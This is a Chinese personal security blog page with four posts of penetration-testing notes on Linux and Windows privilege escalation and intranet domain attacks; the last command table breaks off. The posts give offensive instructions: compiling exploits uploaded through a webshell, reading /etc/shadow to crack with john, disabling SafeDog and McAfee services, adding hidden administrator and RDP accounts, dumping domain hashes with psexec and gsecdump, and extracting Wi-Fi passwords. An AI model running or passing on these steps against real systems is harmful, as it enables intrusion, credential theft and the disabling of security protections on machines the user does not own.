
 <!DOCTYPE HTML>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  
    <title>Bug&#39;小虫</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="小虫">
    

    
    <meta name="description" content="hark">
<meta property="og:type" content="website">
<meta property="og:title" content="Bug&#39;小虫">
<meta property="og:url" content="http://yoursite.com/page/5/index.html">
<meta property="og:site_name" content="Bug&#39;小虫">
<meta property="og:description" content="hark">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Bug&#39;小虫">
<meta name="twitter:description" content="hark">

    
    <link rel="alternative" href="/atom.xml" title="Bug&#39;小虫" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/favicon.ico">
    
    
    <link rel="apple-touch-icon" href="/img/jacman.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
    
    <link rel="stylesheet" href="/css/style.css">
</head>

  <body>
    <header>
      
<div>
		
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="Bug&#39;小虫">Bug&#39;小虫</a></h1>
				<h2 class="blog-motto">走过黑暗，前面便是光</h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
			</a></div>
			<nav class="animated">
				<ul>
					<ul>
					 
						<li><a href="/">Home</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
						<li><a href="/about">About</a></li>
					
					<li>
 					
					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
						<label>Search</label>
						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
						<input type="hidden" name="q" value="site:yoursite.com">
					</form>
					
					</li>
				</ul>
			</nav>			
</div>
    </header>
    <div id="container">
      <div id="main">

   
    
    <article class="post-expand [layout]" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2016/01/01/linux提权常用命令/" title="linux提权常用命令" itemprop="url">linux提权常用命令</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h3 id="uname"><a href="#uname" class="headerlink" title="uname"></a>uname</h3><p>输出一组系统信息。如果不跟随选项，则视为只附加-s选项。常跟的参数有-a，在我的Ubuntu10.10的终端中执行uname-a命令后显示，其中最前面的Linux表示是基于Linux内核的，2.6.35-28是具体的内核版本号。这个内核版本号非常重要，因为如果是采用溢出漏洞提权的话内核版本号是寻找溢出漏洞利用程序最重要的参考信息，根据当前的内核版本号寻找适用于这个版本号的漏洞利用程序。</p>
<h3 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h3><p>获得当前目录，在用webshell上传漏洞和用程序前执行一下pwd命令获得当前目录，把漏洞利用程序直接上传到当前目录，在执行漏洞利用程序时就可以免去输入目录的麻烦。执行pwd命令后显示/home/test，说明当前目录为/home/test/。另外，通过webshell比如PhpSpy的“Back Connect”反弹回来的shell默认的当前目录为webshell所在的目录。</p>
<h3 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h3><p>显示网络配置信息，比如显示有哪些网卡，每块网卡的配置信息（IP地址、MAC地址、子网掩码）等，常用参数-a执行ifconfig-a命令后显示。从信息可以知道，当前系统共有一块网卡etho，IP地址为192.168.19.138，子网掩码为255.255.255.0。</p>
<h3 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h3><p>显示当前的网络连接状态，与Windows系统下的netstat命令写法相同，功能也差不多。</p>
<p>执行netstat后显示了很多网络连接的信息。</p>
<h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><p>ps是用来报告程序执行状况的指令，你可以搭配kill指令随时中断，删除不必要的程序。常用的参数有a，u，x<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a 显示现行终端机下的所有程序，包括其他用户的程序。</span><br><span class="line">u 以用户为主的格式来显示程序状况。</span><br><span class="line">x 显示所有程序，不以终端机来区分。</span><br></pre></td></tr></table></figure></p>
<p>执行ps aux命令后显示，显示了程序的进程id，CPU占用率等详细信息，如果要结束某个程序，只需要用命令kill-9 PID就可以结束，其中PID就是在执行ps aux命令时显示的程序的PID，当然前提是要有相应的权限。</p>
<h3 id="gcc"><a href="#gcc" class="headerlink" title="gcc"></a>gcc</h3><p>很多Linux下的漏洞利用程序都是用C语言写的，我们得到的很多时候是漏洞利用程序的C语言的源代码，要想得到可执行程序，需要对源代码进行编辑，这时候就用到大名鼎鼎的gcc了。个别情况下可能因为兼容性的原因必须需要在要提权的Linux主机上编译漏洞利用程序，这时候也需要用到gcc。GCC（GNU Compiler Collection，GNU编译器套装），是一套由GNU开发的编程语言编译器。它是一套以GPL及LGPL许可证所发行的自由软件，也是GNU计划的关键部分，亦是自由的类Unix及苹果电脑Mac OS X操作系统的标准编译器。GCC原名为GNUC语言编译器，因为它原本只能处理C语言，GCC很快地扩展，变得可处理C++，之后也变得可处理Fortran、Pascal、Objective-C、Java，以及Ada与其他语言。</p>
<p>在大多数情况下，你在本地的Linux系统中编译好的溢出漏洞利用程序直接上传到要提权的Linux主机上也能正常使用，不是必须要在要提权的主机上编译溢出漏洞的利用程序。因为gcc特别强大，功能特别多，用法也特别多，要讲全的话估计要一本厚书的篇幅，这里不可能一一介绍，只介绍Linux提权中常用到的两个方面：</p>
<p>(1)gcc-v<br>查看安装的gcc的版本，我们的目的是通过执行gcc-v命令确认系统是否安装了gcc，如果安装了会显示安装的gcc的版本号如果提示找不到命令等说明gcc没有安装。Ubuntu 10.10默认安装了gcc。</p>
<p>(2)另一个用到的重要功能就是把漏洞利用程序的源代码编译成可执行程序了。假设溢出漏洞利用程序源代码文件是exp.c，通过websbell把exp.c上传到了要提权的Linux主机的当前目录下，在反弹回来的命令窗口中执行gcc-o exp exp.c，就会把exp.c编程成可执行程序exp，其中-o参数后面跟着的是编译生成的可执行程序的名字，这里为exp，另一个参数exp.c是要编译的溢出漏洞利用程序源代码的文件名，这里为exp.c。执行命令后如果没有错误提示就说明编译成功了。执行一下命令ls，发现可执行文件exp已经生成了。<br>接下来输入./exp就可以运行漏洞利用程序exp了，如果溢出成功会显示，注意下面的那个#，对Linux有点了解的都知道#对应的是root权限，看到#就说明提权成功了，接下来你就可以以root权限运行各种命令了。<br>在通过溢出漏洞获得root权限后，能执行的命令就多了，很多没提权前没权限执行的命令现在都可以执行了。这时候可以执行一些命令来获取一些敏感信息或进行留后门清理日志等操作，方便更好的控制提权成功的服务器。</p>
<h3 id="cat-bash-history"><a href="#cat-bash-history" class="headerlink" title="cat .bash_history"></a>cat .bash_history</h3><p>查看该用户曾经执行过的命令，也就是查看root用户执行过的命令。因为Linux下很多管理操作都是在命令行下完成的，而正常情况下用root用户执行命令的是管理员，通过查看管理员输入的命令，可能得到很多敏感信息。       </p>
<h3 id="cat-etc-passwd-cat-etc-shadow"><a href="#cat-etc-passwd-cat-etc-shadow" class="headerlink" title="cat/etc/passwd cat/etc/shadow"></a>cat/etc/passwd cat/etc/shadow</h3><p>分别执行cat/etc/passwd，cat/etc/shadow命令后得到passwd和shadow的内容，把两个文件的内容保存到本地用john挂字典尝试破解root用户的密码，具体怎么破可以自己查询相关信息。cat/etc/shadow只有root权限才能执行。</p>
<h3 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h3><p>在提权成功获得root权限后你如果想下载服务器上的一个文件到本地，我的方法是先执行cp命令把要下载的文件复制到网站的Web目录下，但复制过去的文件只有root用户能访问，直接用浏览器下载会提示没有权限，这时候就需要用到chmod命令了。chmod命令的作用是变更文件或目录的权限。如果要下载的文件是shadow1，执行命令chmod 777./shadow1后就可以直接用浏览器下载了，不会再有权限问题了。</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/提权/">提权</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand [layout]" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2016/01/01/关闭安全狗/" title="杀狗提权" itemprop="url">杀狗提权</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>前言：<br>提权时遇到安全狗，可以添加账户，但是提到管理组老是失败，查看了一下服务，发现一条狗<br>如图：虽然提示加入管理组成功，但是仍然没有成功<br><img src="http://opgnaclz6.bkt.clouddn.com/24.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"><br>因为杀狗要system权限，所以反弹system到msf<br><img src="http://opgnaclz6.bkt.clouddn.com/25.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"><br>如图，表示成功反弹<br><img src="http://opgnaclz6.bkt.clouddn.com/26.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"><br>依次执行下面六条语句<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc delete <span class="string">"服务名"</span> //删除自启动</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc delete <span class="string">"Safedog Update Center"</span></span><br><span class="line">sc delete <span class="string">"SafeDogCloudHelper"</span></span><br><span class="line">sc delete <span class="string">"SafeDogGuardCenter"</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc config <span class="string">"服务名"</span> start= disabled  //把这个服务禁止</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc config <span class="string">"Safedog Update Center"</span> start= disabled</span><br><span class="line">sc config <span class="string">"SafeDogCloudHelper"</span> start= disabled</span><br><span class="line">sc config <span class="string">"SafeDogGuardCenter"</span> start= disabled</span><br></pre></td></tr></table></figure>
<p>重启计算机:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutdown -r -t 1</span><br></pre></td></tr></table></figure></p>
<p>等待开机后就可以在shell添加到管理组了</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/提权/">提权</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand [layout]" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2016/01/01/windows提权常用命令/" title="windows提权常用命令" itemprop="url">windows提权常用命令</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>平时常用到的windows提权命令，纯粹当成个人笔记方便以后查阅。还在不断更新中。。。。。。<br>开启3389:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">" "</span>Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></p>
<p>查看3389:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">" "</span>Server\WinStations\RDP-Tcp /v PortNumber</span><br></pre></td></tr></table></figure></p>
<p>查看端口8001被哪个进程占用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr <span class="string">"8001"</span></span><br></pre></td></tr></table></figure></p>
<p>查看PID3736<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist | findstr <span class="string">"3736"</span></span><br></pre></td></tr></table></figure></p>
<p>结束进程<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskkill /f /t /im java.exe</span><br></pre></td></tr></table></figure></p>
<p>查看版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ver</span><br></pre></td></tr></table></figure></p>
<p>查看当前用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure></p>
<p>查看系统配置信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure></p>
<p>查看用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure></p>
<p>查看进程：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure></p>
<p>查看正在运行的服务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure></p>
<p>查看开放的所有端口：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure></p>
<p>查询会话情况：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user  //当前这个服务器中有哪些用户正在访问这个服务器</span><br></pre></td></tr></table></figure></p>
<p>查看指定服务的路径：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc qc mssql</span><br></pre></td></tr></table></figure></p>
<p>添加一个用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user xiaochong xiaochong /add</span><br></pre></td></tr></table></figure></p>
<p>提升到管理权限：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators xiaochong /add</span><br></pre></td></tr></table></figure></p>
<p>添加用户并提升权限：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user jianmei daxia.asd /add &amp; net localgroup administrators jianmei /add</span><br></pre></td></tr></table></figure></p>
<p>查看指定用户的信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user xiaochong</span><br></pre></td></tr></table></figure></p>
<p>查看所有管理权限的用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure></p>
<p>加入远程桌面用户组：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup “Remote Desktop Users” xiaochong /add</span><br></pre></td></tr></table></figure></p>
<p>突破最大连接数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mstsc /admin /v:192.168.1.101</span><br></pre></td></tr></table></figure></p>
<p>删除用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user xiaochong /del</span><br></pre></td></tr></table></figure></p>
<p>开启TELNET服务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start telnet</span><br></pre></td></tr></table></figure></p>
<p>关闭麦咖啡：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net stop “McAfee McShield”</span><br></pre></td></tr></table></figure></p>
<p>查看当前目录的所有文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir c:\windows\</span><br></pre></td></tr></table></figure></p>
<p>查看指定文件的内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\windows\Debug.txt</span><br></pre></td></tr></table></figure></p>
<p>把Debug.txt复制到C:\windows\addins\并命名为cmd.txt：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\windows\Debug.txt C:\windows\addins\cmd.txt</span><br></pre></td></tr></table></figure></p>
<p>切换到系统根目录：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> \</span><br></pre></td></tr></table></figure></p>
<p>返回上一级目录：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ..</span><br></pre></td></tr></table></figure></p>
<p>进入系统e盘：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e：</span><br></pre></td></tr></table></figure></p>
<p>如果直接进入c:\windows\system32\目录，可执行如下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pushd c:\windows\system32\</span><br></pre></td></tr></table></figure></p>
<p>创建ahackj文件夹：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Md xiaochong</span><br></pre></td></tr></table></figure></p>
<p>删除xiaochong文件夹：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rd xiaochong</span><br></pre></td></tr></table></figure></p>
<p>删除网站目录下的xiaochong.asp文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Del E:\xinyun\xiaochong.asp</span><br></pre></td></tr></table></figure></p>
<p>创建空的文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> nul&gt;文件名</span><br></pre></td></tr></table></figure></p>
<p>创建有内容文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"内容"</span>&gt;文件名</span><br></pre></td></tr></table></figure></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/提权/">提权</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand [layout]" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2016/01/01/内网渗透命令总结/" title="内网渗透命令总结" itemprop="url">内网渗透命令总结</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h3 id="域常用操作命令："><a href="#域常用操作命令：" class="headerlink" title="域常用操作命令："></a>域常用操作命令：</h3><table>
<thead>
<tr>
<th></th>
<th style="text-align:center"></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>net group /domain</td>
<td style="text-align:center">//获得所有域用户组列表</td>
</tr>
<tr>
<td>net group qq_group /domain</td>
<td style="text-align:center">//显示域中qq_group组的成员</td>
</tr>
<tr>
<td>net group qq_group /del /domain</td>
<td style="text-align:center">//删除域中qq_group组</td>
</tr>
<tr>
<td>net group qq_group qq /del /domain</td>
<td style="text-align:center">//删除域内qq_group 群组中的成员QQ</td>
</tr>
<tr>
<td>net group qq_group /add /domain</td>
<td style="text-align:center">//增加域中的群组</td>
</tr>
<tr>
<td>net group “domain admins” /domain</td>
<td style="text-align:center">//获得域管理员列表</td>
</tr>
<tr>
<td>net group “enterprise admins” /domain</td>
<td style="text-align:center">//获得企业管理员列表</td>
</tr>
<tr>
<td>net localgroup administrators /domain</td>
<td style="text-align:center">//获取域内置administrators组用（enterprise admins、domain admins）</td>
</tr>
<tr>
<td>net group “domain controllers” /domain</td>
<td style="text-align:center">//获得域控制器列表</td>
</tr>
<tr>
<td>net group “domain computers” /domain</td>
<td style="text-align:center">//获得所有域成员计算机列表</td>
</tr>
<tr>
<td>net user /domain</td>
<td style="text-align:center">//获得所有域用户列表</td>
</tr>
<tr>
<td>net user someuser /domain</td>
<td style="text-align:center">//获得指定账户someuser的详细信息</td>
</tr>
<tr>
<td>net accounts /domain</td>
<td style="text-align:center">//获得域密码策略设置，密码长短，错误锁定等信息</td>
</tr>
<tr>
<td>nei view /domain</td>
<td style="text-align:center">//查询有几个域, 查询域列表</td>
</tr>
<tr>
<td>net view /domain:testdomain</td>
<td style="text-align:center">//查看 testdomain域中的计算机列表</td>
</tr>
<tr>
<td>nltest /domain_trusts</td>
<td style="text-align:center">//获取域信任信息</td>
</tr>
<tr>
<td>net user domain-admin /domain</td>
<td style="text-align:center">//查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息</td>
</tr>
<tr>
<td>net config Workstation</td>
<td style="text-align:center">//查询机器属于哪个域</td>
</tr>
<tr>
<td>net time /domian</td>
<td style="text-align:center">//查询主域服务器的时间</td>
</tr>
<tr>
<td>echo %logonserver%</td>
<td style="text-align:center">//查看登陆到这台服务器的计算机名</td>
</tr>
<tr>
<td>net time  \192.168.1.1</td>
<td style="text-align:center">//查询远程共享主机192.168.1.1的时间</td>
</tr>
<tr>
<td>net use \IP\ipc$ password /user:username@domain</td>
<td style="text-align:center">//ipc$域内连接</td>
</tr>
<tr>
<td>net  view  \dc2.backlion.com</td>
<td style="text-align:center">//查看域控共享情况</td>
</tr>
<tr>
<td>dir \dc2.backlion.com\SYSVOL /s /a &gt; sysvol.txt</td>
<td style="text-align:center">//列出sysvol日志记录</td>
</tr>
<tr>
<td>xcopy \dc2.backlion.com\sysvol.txt sysvol.txt  /i  /e  /c</td>
<td style="text-align:center">//远程拷贝到本地sysvol日志</td>
</tr>
<tr>
<td>net user  /domain  bk bk123</td>
<td style="text-align:center">//修改域内用户密码，需要管理员权限</td>
</tr>
<tr>
<td>net  localgroup  administartors   SEZKL\backlion  /add</td>
<td style="text-align:center">//将SEZKL域中的用户backlion添加到administrators组中</td>
</tr>
<tr>
<td>mstsc /admin</td>
<td style="text-align:center">//远程桌面登录到console会话解决hash无法抓出问题</td>
</tr>
<tr>
<td>gpupdate/force</td>
<td style="text-align:center">//更新域策略</td>
</tr>
<tr>
<td>psexec \192.168.1.3 -u administrator -p bk1234 -c gsecdump.exe -u</td>
<td style="text-align:center">//从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来</td>
</tr>
<tr>
<td>gsecdump  -a</td>
<td style="text-align:center">//获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值</td>
</tr>
<tr>
<td>tasklist /S ip /U domain\username /P /V</td>
<td style="text-align:center">//查看远程计算机进程列</td>
</tr>
</tbody>
</table>
<h3 id="基本内网渗透命令："><a href="#基本内网渗透命令：" class="headerlink" title="基本内网渗透命令："></a>基本内网渗透命令：</h3><table>
<thead>
<tr>
<th></th>
<th style="text-align:center"></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>ipconfig/all</td>
<td style="text-align:center">//查看IP地址</td>
</tr>
<tr>
<td>ipconfig /release</td>
<td style="text-align:center">//释放地址</td>
</tr>
<tr>
<td>ipconfig /renew</td>
<td style="text-align:center">//重新获取Ip地址</td>
</tr>
<tr>
<td>whoami</td>
<td style="text-align:center">//查询账号所属权限</td>
</tr>
<tr>
<td>whoami/all</td>
<td style="text-align:center">//查看sid值</td>
</tr>
<tr>
<td>systeminfo</td>
<td style="text-align:center">//查询系统以及补丁信息</td>
</tr>
<tr>
<td>tasklist /svc</td>
<td style="text-align:center">//查看进程</td>
</tr>
<tr>
<td>taskkill /im 进程名称(cmd)</td>
<td style="text-align:center">//结束进程</td>
</tr>
<tr>
<td>taskkill /pid[进程码]</td>
<td style="text-align:center">// -t(结束该进程) -f(强制结束该进程以及所有子进程)</td>
</tr>
<tr>
<td>wmic qfe  get hotfixid</td>
<td style="text-align:center">//查看已安装过得补丁，这个很实用</td>
</tr>
<tr>
<td>wmic qfe list full /format:htable &gt; hotfixes.htm</td>
<td style="text-align:center">//详细的补丁安装</td>
</tr>
<tr>
<td>wmic  qfe</td>
<td style="text-align:center">//查询补丁信息以及微软提供的下载地址</td>
</tr>
<tr>
<td>ping hostname(主机名）</td>
<td style="text-align:center">//显示该机器名的IP</td>
</tr>
<tr>
<td>net start</td>
<td style="text-align:center">//查看当前运行的服务</td>
</tr>
<tr>
<td>net user</td>
<td style="text-align:center">//查看本地组的用户</td>
</tr>
<tr>
<td>net localhroup administrators</td>
<td style="text-align:center">//查看本机管理员组有哪些用户</td>
</tr>
<tr>
<td>net user</td>
<td style="text-align:center">//查看会话</td>
</tr>
<tr>
<td>net session</td>
<td style="text-align:center">//查看当前会话</td>
</tr>
<tr>
<td>net share</td>
<td style="text-align:center">//查看SMB指向的路径[即共享]</td>
</tr>
<tr>
<td>wmic share get name,path</td>
<td style="text-align:center">//查看SMB指向的路径</td>
</tr>
<tr>
<td>wmic nteventlog get path,filename,writeable</td>
<td style="text-align:center">//查询系统日志文件存储位置</td>
</tr>
<tr>
<td>net use \IP\ipc$  password  /user:username</td>
<td style="text-align:center">//建立IPC会话（工作组模式）</td>
</tr>
<tr>
<td>net use  z:  \192.168.1.1</td>
<td style="text-align:center">//建立映射到本机Z盘</td>
</tr>
<tr>
<td>net time \172.16.16.2</td>
<td style="text-align:center">//查询共享主机的是</td>
</tr>
<tr>
<td>at \172.16.16.2 13:50 c:\windows\2009.exe</td>
<td style="text-align:center">//在共享主机上执行</td>
</tr>
<tr>
<td>netstat  -ano</td>
<td style="text-align:center">//查看开放的端口</td>
</tr>
<tr>
<td>netstat -an</td>
<td style="text-align:center">find “3389”</td>
<td>//找到3389端口</td>
</tr>
<tr>
<td>net accounts</td>
<td style="text-align:center">//查看本地密码策略</td>
</tr>
<tr>
<td>netstat –A ip</td>
<td style="text-align:center">//netbiso查询</td>
</tr>
<tr>
<td>net view</td>
<td style="text-align:center">//查看机器注释或许能得到当前活动状态的机器列表，如果禁用netbios就查看不出来</td>
</tr>
<tr>
<td>echo %PROCESSOR_ARCHITECTURE%</td>
<td style="text-align:center">//查看系统是32还是64位</td>
</tr>
<tr>
<td>set</td>
<td style="text-align:center">//查看系统环境设置变量</td>
</tr>
<tr>
<td>net start</td>
<td style="text-align:center">//查看当前运行的服务</td>
</tr>
<tr>
<td>wmic service list brief</td>
<td style="text-align:center">//查看进程服务</td>
</tr>
<tr>
<td>wmic process list brief</td>
<td style="text-align:center">//查看进程</td>
</tr>
<tr>
<td>wmic startup list brief</td>
<td style="text-align:center">//查看启动程序信息</td>
</tr>
<tr>
<td>wmic product list brief</td>
<td style="text-align:center">//查看安装程序和版本信息（漏洞利用线索）</td>
</tr>
<tr>
<td>wmic startup list full</td>
<td style="text-align:center">//识别开机启动的程序</td>
</tr>
<tr>
<td>wmic process where(description=”mysqld.exe”)&gt;&gt;mysql.log</td>
<td style="text-align:center">//获取软件安装路径</td>
</tr>
<tr>
<td>for /f “skip=9 tokens=1,2 delims=:” %i in (‘netsh wlan showprofiles’) do @echo %j</td>
<td style="text-align:center">findstr</td>
</tr>
<tr>
<td>-i -v echo</td>
<td style="text-align:center">netsh wlan show profiles %jkey=clear</td>
<td>//一键获取wifi密码</td>
</tr>
<tr>
<td>if defined PSModulePath (echo 支持powershell) else (echo 不支持powershell)</td>
<td style="text-align:center">//查看是否支持posershell</td>
</tr>
<tr>
<td>qwinsta</td>
<td style="text-align:center">//查看登录情况</td>
</tr>
<tr>
